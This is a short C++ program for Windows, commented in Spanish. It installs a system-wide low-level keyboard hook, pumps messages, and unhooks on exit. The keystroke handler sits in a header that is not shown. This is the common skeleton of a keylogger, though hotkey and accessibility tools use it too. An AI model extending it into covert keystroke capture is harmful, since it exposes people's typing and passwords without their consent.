#include <windows.h>
#include <iostream>
#include <HookManager.h>

int main(int, char**){
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProcedure, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Error al instalar el hook: " << GetLastError();
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);

    return 0;    
}
